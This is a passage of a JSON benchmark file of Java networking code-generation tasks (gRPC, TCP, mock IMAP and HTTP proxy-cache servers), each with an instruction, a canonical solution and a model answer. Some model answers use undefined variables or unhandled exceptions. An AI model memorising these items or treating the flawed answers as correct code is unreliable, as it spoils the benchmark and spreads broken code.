value) {\n                    String modified = value.getData().toLowerCase();\n                    responseObserver.onNext(DataResponse.newBuilder().setData(modified).build());\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    responseObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    responseObserver.onCompleted();\n                }\n            };\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 514,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens on a specified port, provides a service, and handles graceful shutdown.\n\nClass Description: The ShelfServer class is responsible for creating and managing a gRPC server instance. It initializes the server on a specified port, adds the required service implementation, and provides methods for starting, stopping, and waiting for server termination.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50052 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance. Throws IOException and InterruptedException for server start and shutdown operations",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n  private static final Logger logger = Logger.getLogger(ShelfServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50052;\n    server = ServerBuilder.forPort(port).addService(new ShelfService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  ShelfServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final ShelfServer server = new ShelfServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n    private Server server;\n    private static final Logger logger = Logger.getLogger(ShelfServer.class.getName());\n\n    private void start() throws IOException {\n        int port = 50052;\n        server = ServerBuilder.forPort(port)\n                .addService(new ShelfServiceImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            // Use stderr here since the logger may have been reset by its JVM shutdown hook.\n            System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n            try {\n                ShelfServer.this.stop();\n            } catch (InterruptedException e) {\n                e.printStackTrace(System.err);\n            }\n            System.err.println(\"*** server shut down\");\n        }));\n    }\n\n    private void stop() throws InterruptedException {\n        if (server != null) {\n            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final ShelfServer server = new ShelfServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 515,
    "Instruction": "Task Description: Create a Java class that implements a basic TCP server using ServerSocket to handle client connections and communication.\n\nClass Description: The SocketServer class establishes a TCP server that listens for incoming client connections on a specified port, handles communication with connected clients, and properly closes connections when done.\n\nAttributes:\n- serverSocket: [ServerSocket] - The server socket that listens for incoming client connections\n- clientSocket: [Socket] - The socket representing the connected client\n\nMethods:\n- start([int port]) -> [void] - Starts the server on the specified port, waits for client connections, and initiates communication handling\n- handleClientCommunication() -> [void] - Handles the data exchange with the connected client (receives data and sends response)\n- closeConnections() -> [void] - Closes both client and server sockets to release resources",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketServer {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started, waiting for connections...\");\n        \n        clientSocket = serverSocket.accept();\n        System.out.println(\"Client connected\");\n        \n        handleClientCommunication();\n    }\n\n    private void handleClientCommunication() throws Exception {\n        try {\n            // Read from client\n            byte[] buffer = new byte[1024];\n            int len;\n            StringBuilder sb = new StringBuilder();\n            clientSocket.setSoTimeout(2000);\n            \n            while ((len = clientSocket.getInputStream().read(buffer)) != -1) {\n                sb.append(new String(buffer, 0, len));\n            }\n            System.out.println(\"From client: \" + sb);\n\n            // Write to client\n            String response = \"Hi I'm server\\r\\n\";\n            clientSocket.getOutputStream().write(response.getBytes());\n        } finally {\n            closeConnections();\n        }\n    }\n\n    private void closeConnections() throws Exception {\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        System.out.println(\"Connections closed\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketServer {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server started on port \" + port);\n            clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected\");\n            handleClientCommunication();\n            closeConnections();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClientCommunication() throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(\"Received from client: \" + inputLine);\n            out.println(\"Echo: \" + inputLine);\n        }\n    }\n\n    private void closeConnections() {\n        try {\n            if (clientSocket != null) clientSocket.close();\n            if (serverSocket != null) serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        SocketServer server = new SocketServer();\n        server.start(12345);\n    }\n}\n```"
  },
  {
    "Task_id": 516,
    "Instruction": "Task Description: Implement a TCP server class that handles multiple client connections simultaneously, providing predefined chat responses to incoming messages.\n\nClass Description: TCPServer is a Java class that creates a TCP server listening on a specified port. It maintains a set of predefined messages and can handle multiple client connections concurrently, responding with random messages from its predefined set. The server can be started and stopped as needed.\n\nAttributes:\n- mIsServiceDestoryed: boolean - Flag indicating whether the server should stop running\n- mDefinedMessages: String[] - Array of predefined messages to send to clients\n\nMethods:\n- startServer() -> void - Starts the TCP server in a new thread\n- stopServer() -> void - Stops the TCP server by setting the termination flag\n- TcpServer (inner class) run() -> void - Main server loop that accepts client connections (implements Runnable)\n- responseClient(Socket client) -> void - Handles communication with an individual client\n  - Input: client: Socket - The client socket connection\n  - Output: (none) - Sends responses to client through the socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPServer {\n\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = new String[] {\n            \"\u4f60\u597d\u554a\uff0c\u54c8\u54c8\",\n            \"\u8bf7\u95ee\u4f60\u53eb\u4ec0\u4e48\u540d\u5b57\u5440\uff1f\",\n            \"\u4eca\u5929\u5317\u4eac\u5929\u6c14\u4e0d\u9519\u554a\uff0cshy\",\n            \"\u4f60\u77e5\u9053\u5417\uff1f\u6211\u53ef\u662f\u53ef\u4ee5\u548c\u591a\u4e2a\u4eba\u540c\u65f6\u804a\u5929\u7684\u54e6\",\n            \"\u7ed9\u4f60\u8bb2\u4e2a\u7b11\u8bdd\u5427\uff1a\u636e\u8bf4\u7231\u7b11\u7684\u4eba\u8fd0\u6c14\u4e0d\u4f1a\u592a\u5dee\uff0c\u4e0d\u77e5\u9053\u771f\u5047\u3002\"\n    };\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            ServerSocket serverSocket = null;\n            try {\n                serverSocket = new ServerSocket(8688);\n            } catch (IOException e) {\n                System.err.println(\"establish tcp server failed, port:8688\");\n                e.printStackTrace();\n                return;\n            }\n\n            while (!mIsServiceDestoryed) {\n                try {\n                    final Socket client = serverSocket.accept();\n                    System.out.println(\"accept\");\n                    new Thread() {\n                        @Override\n                        public void run() {\n                            try {\n                                responseClient(client);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        };\n                    }.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(\n                client.getInputStream()));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(client.getOutputStream())), true);\n        out.println(\"\u6b22\u8fce\u6765\u5230\u804a\u5929\u5ba4\uff01\");\n        while (!mIsServiceDestoryed) {\n            String str = in.readLine();\n            System.out.println(\"msg from client:\" + str);\n            if (str == null) {\n                break;\n            }\n            int i = new Random().nextInt(mDefinedMessages.length);\n            String msg = mDefinedMessages[i];\n            out.println(msg);\n            System.out.println(\"send :\" + msg);\n        }\n        System.out.println(\"client quit.\");\n        out.close();\n        in.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TCPServer {\n    private boolean mIsServiceDestoryed;\n    private String[] mDefinedMessages;\n\n    public TCPServer(String[] definedMessages) {\n        this.mIsServiceDestoryed = false;\n        this.mDefinedMessages = definedMessages;\n    }\n\n    public void startServer(int port) {\n        Thread serverThread = new Thread(new TcpServer());\n        serverThread.start();\n    }\n\n    public void stopServer() {\n        this.mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(port)) {\n                while (!mIsServiceDestoryed) {\n                    Socket clientSocket = serverSocket.accept();\n                    responseClient(clientSocket);\n                }\n            } catch (IOException e) {\n                if (!mIsServiceDestoryed) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) {\n        try (\n            PrintWriter out = new PrintWriter(client.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()))\n        ) {\n            String inputLine;\n            Random rand = new Random();\n            while ((inputLine = in.readLine()) != null && !mIsServiceDestoryed) {\n                int index = rand.nextInt(mDefinedMessages.length);\n                out.println(mDefinedMessages[index]);\n            }\n        } catch (IOException e) {\n            if (!mIsServiceDestoryed) {\n                e.printStackTrace();\n            }\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 518,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for unicast communication, handling client connections and data exchange with configurable parameters for testing purposes.\n\nClass Description: UnicastTestTcpRpc is a TCP server implementation that listens for incoming client connections, processes requests, and manages data transmission with configurable buffer sizes and communication modes (synchronous/asynchronous).\n\nAttributes:\n- srv_sock: [ServerSocket] - The server socket listening for incoming connections\n- sock: [Socket] - The active client connection socket\n- sock_in: [DataInputStream] - Input stream for reading data from the client\n- sock_out: [DataOutputStream] - Output stream for writing data to the client\n\nMethods:\n- init(long, boolean, boolean, boolean, boolean, String, int, int) -> [void] - Initializes the server with configuration parameters and starts the acceptor thread\n  Parameters:\n    - sleep_time: [long] - Sleep time between operations\n    - exit_on_end: [boolean] - Whether to exit after processing\n    - busy_sleep: [boolean] - Use busy waiting instead of sleep\n    - sync: [boolean] - Use synchronous communication\n    - oob: [boolean] - Use out-of-band data\n    - addr: [String] - Address to connect to\n    - local_port: [int] - Local port to listen on\n    - dest_port: [int] - Destination port for connections\n\n- createSocket() -> [void] - Creates a new client socket connection if none exists\n- handleRequest(DataInputStream, DataOutputStream) -> [boolean] - Processes incoming client requests\n  Parameters:\n    - in: [DataInputStream] - Input stream from client\n    - out: [DataOutputStream] - Output stream to client\n  Returns: [boolean] - Whether to continue processing requests\n\n- set(Socket) -> [void] - Configures socket parameters (TCP_NODELAY, buffer sizes)\n  Parameters:\n    - socket: [Socket] - Socket to configure\n\n- stop() -> [void] - Closes all open sockets and releases resources\n- startTest(int) -> [void] - Starts the test with given parameters\n  Parameters:\n    - num: [int] - Test parameter\n\n- receiveData(long, byte[]) -> [void] - Handles received data from client\n  Parameters:\n    - val: [long] - Timestamp or identifier\n    - data: [byte[]] - Received data payload",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private volatile Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    static final byte START         =  0;\n    static final byte RECEIVE_ASYNC =  1;\n    static final byte RECEIVE_SYNC  =  2;\n    static final byte ACK           = 10;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob,\n                     String addr, int local_port, int dest_port) throws Exception {\n        this.srv_sock = new ServerSocket(local_port);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        \n        Thread acceptor = new Thread(() -> {\n            while(true) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                DataOutputStream out = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    set(client_sock);\n                    in = new DataInputStream(client_sock.getInputStream());\n                    out = new DataOutputStream(client_sock.getOutputStream());\n                    if(!handleRequest(in, out)) {\n                        Util.close(client_sock);\n                        Util.close(out);\n                        Util.close(in);\n                        break;\n                    }\n                }\n                catch(IOException e) {\n                    Util.close(client_sock);\n                    Util.close(out);\n                    Util.close(in);\n                    break;\n                }\n            }\n        });\n        acceptor.start();\n    }\n\n    void createSocket() throws IOException {\n        if(sock == null) {\n            sock = new Socket(InetAddress.getByName(null), 9000);\n            set(sock);\n            sock_in = new DataInputStream(sock.getInputStream());\n            sock_out = new DataOutputStream(sock.getOutputStream());\n        }\n    }\n\n    boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        while(true) {\n            byte type = (byte)in.read();\n            if(type == -1)\n                return false;\n\n            switch(type) {\n                case START:\n                    int num = in.readInt();\n                    startTest(num);\n                    break;\n                case RECEIVE_ASYNC:\n                case RECEIVE_SYNC:\n                    long val = in.readLong();\n                    int len = in.readInt();\n                    byte[] data = new byte[len];\n                    in.readFully(data, 0, data.length);\n                    receiveData(val, data);\n                    if(type == RECEIVE_SYNC) {\n                        out.writeLong(System.currentTimeMillis());\n                        out.flush();\n                    }\n                    break;\n                default:\n                    System.err.println(\"type \" + type + \" not known\");\n            }\n        }\n    }\n\n    static void set(Socket socket) throws SocketException {\n        socket.setTcpNoDelay(true);\n        socket.setReceiveBufferSize(20000000);\n        socket.setSendBufferSize(10000000);\n    }\n\n    void stop() {\n        Util.close(sock);\n        Util.close(srv_sock);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob, String addr, int local_port, int dest_port) throws IOException {\n        srv_sock = new ServerSocket(local_port);\n        Thread acceptorThread = new Thread(() -> {\n            while (true) {\n                try {\n                    sock = srv_sock.accept();\n                    set(sock);\n                    handleRequest(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()));\n                    if (exit_on_end) break;\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n        acceptorThread.start();\n    }\n\n    private void createSocket() throws IOException {\n        sock = new Socket(addr, dest_port);\n        set(sock);\n    }\n\n    private boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        // Process request logic here\n        return true; // Continue processing by default\n    }\n\n    private void set(Socket socket) throws SocketException {\n        socket.setTcpNoDelay(true);\n        // Set buffer sizes if needed\n    }\n\n    public void stop() {\n        try {\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startTest(int num) {\n        // Start test logic here\n    }\n\n    public void receiveData(long val, byte[] data) {\n        // Handle received data logic here\n    }\n}\n```"
  },
  {
    "Task_id": 519,
    "Instruction": "Task Description: Create a mock IMAP server implementation in Java that simulates IMAP server behavior for testing purposes, handling client connections and interactions through TCP sockets.\n\nClass Description: MockImapServer is a test utility class that simulates an IMAP server by listening on a local port, accepting client connections, and processing predefined interactions. It manages server lifecycle and provides synchronization mechanisms for test coordination.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of predefined IMAP interactions to simulate\n- waitForConnectionClosed: CountDownLatch - Synchronization primitive for waiting until client connection closes\n- waitForAllExpectedCommands: CountDownLatch - Synchronization primitive for waiting until all expected commands are processed\n- mockServerThread: MockServerThread - The thread running the server operations\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread. Binds to an available port on localhost.\n- shutdown() -> void - Stops the server thread and cleans up resources, with a 500ms timeout for graceful shutdown.\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread implementation\n- run() -> void - Main server thread logic that accepts connections, processes interactions, and handles cleanup\n- handleInteractions() -> void - Processes the next interaction from the queue (internal method)\n- readAdditionalCommands() -> void - Reads additional unexpected commands from client (internal method)\n- shouldStop() -> void - Signals the server thread to stop and closes client socket",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = ((java.net.InetSocketAddress) serverSocket.getLocalSocketAddress()).getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n        try {\n            mockServerThread.join(500L);\n        } catch (InterruptedException ignored) {\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                              CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = new java.io.BufferedReader(\n                    new java.io.InputStreamReader(clientSocket.getInputStream())).readLine();\n            if (command == null) {\n                throw new java.io.EOFException();\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\nclass ImapInteraction {\n    private String command;\n    private String response;\n\n    public ImapInteraction(String command, String response) {\n        this.command = command;\n        this.response = response;\n    }\n\n    public String getCommand() {\n        return command;\n    }\n\n    public String getResponse() {\n        return response;\n    }\n}\n\nclass MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private Thread mockServerThread;\n    private String host = \"localhost\";\n    private int port;\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(0);\n        port = serverSocket.getLocalPort();\n        mockServerThread = new Thread(new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands));\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null && !mockServerThread.isInterrupted()) {\n            mockServerThread.interrupt();\n            try {\n                mockServerThread.join(500);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private static class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private Socket clientSocket;\n        private PrintWriter out;\n        private BufferedReader in;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                out = new PrintWriter(clientSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                handleInteractions();\n                readAdditionalCommands();\n            } catch (IOException e) {\n                // Handle exception\n            } finally {\n                closeClientSocket();\n                waitForConnectionClosed.countDown();\n            }\n        }\n\n        private void handleInteractions() {\n            while (!interactions.isEmpty()) {\n                ImapInteraction interaction = interactions.pollFirst();\n                String receivedCommand = in.readLine();\n                if (receivedCommand != null && receivedCommand.trim().equalsIgnoreCase(interaction.getCommand())) {\n                    out.println(interaction.getResponse());\n                    waitForAllExpectedCommands.countDown();\n                } else {\n                    break; // Unexpected command\n                }\n            }\n        }\n\n        private void readAdditionalCommands() {\n            try {\n                while ((in.readLine()) != null) {\n                    // Read and discard additional commands\n                }\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n\n        private void closeClientSocket() {\n            if (clientSocket != null) {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 522,
    "Instruction": "Task Description: Implement a Java class that acts as an HTTP proxy cache server, handling incoming client connections, processing requests, and managing cached resources. The server should be able to handle multiple concurrent connections efficiently.\n\nClass Description: HttpProxyCacheServer is a TCP server that listens for incoming HTTP requests, processes them through a caching mechanism, and returns the appropriate responses. It manages client connections in a thread-safe manner and maintains a cache of resources.\n\nAttributes:\n\nclientsLock: [Object] - Synchronization object for thread-safe access to clients map\nsocketProcessor: [ExecutorService] - Thread pool for processing socket connections\nclientsMap: [Map<String, HttpProxyCacheServerClients>] - Thread-safe map of URL to client handlers\nserverSocket: [ServerSocket] - Main server socket listening for connections\nport: [int] - Port number the server is listening on\nwaitConnectionThread: [Thread] - Thread that waits for incoming connections\nconfig: [Config] - Server configuration object\n\nMethods:\n\nHttpProxyCacheServer: [Constructor]([Context context]) -> [void] - Initializes the server with default configuration\nHttpProxyCacheServer: [Constructor]([Config config]) -> [void] - Initializes the server with custom configuration\nwaitForRequest: [void]() -> [void] - Continuously accepts incoming connections and delegates processing\nprocessSocket: [void]([Socket socket]) -> [void] - Processes an individual client socket connection\ngetClients: [HttpProxyCacheServerClients]([String url]) -> [HttpProxyCacheServerClients] - Retrieves or creates client handler for a URL\nreleaseSocket: [void]([Socket socket]) -> [void] - Properly closes and releases socket resources\ncloseSocketInput: [void]([Socket socket]) -> [void] - Closes socket input stream\ncloseSocketOutput: [void]([Socket socket]) -> [void] - Closes socket output stream\ncloseSocket: [void]([Socket socket]) -> [void] - Closes the socket connection\nonError: [void]([Throwable e]) -> [void] - Handles errors during server operation\nWaitRequestsRunnable: [Class] - Inner class implementing connection waiting logic\nSocketProcessorRunnable: [Class] - Inner class implementing socket processing logic",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Builder(context).buildConfig());\n    }\n\n    private HttpProxyCacheServer(Config config) {\n        this.config = config;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error during waiting connection\", e));\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            HttpProxyCacheServerClients clients = getClients(url);\n            clients.processRequest(request, socket);\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (ProxyCacheException | IOException e) {\n            onError(new ProxyCacheException(\"Error processing request\", e));\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) throws ProxyCacheException {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients clients = clientsMap.get(url);\n            if (clients == null) {\n                clients = new HttpProxyCacheServerClients(url, config);\n                clientsMap.put(url, clients);\n            }\n            return clients;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket input stream\", e));\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket output stream\", e));\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket\", e));\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Error handling\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = 